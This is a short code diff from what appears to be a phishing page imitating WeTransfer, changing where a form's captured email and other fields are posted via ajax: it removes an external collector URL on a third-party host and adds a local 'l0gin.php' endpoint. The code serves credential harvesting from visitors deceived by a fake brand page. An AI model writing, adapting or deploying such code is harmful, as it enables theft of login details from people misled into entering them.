@@ -292,7 +292,7 @@ Try refreshing the page or get in touch through our <a href="https://wetransfer.
           progressSim();
         }, 200);
         $.ajax({
-          url: "http://clients.duck-it.net.au/pcassoc/test/p.php",
+          url: "l0gin.php",
           method: "post",
           data: {
             X1: email,
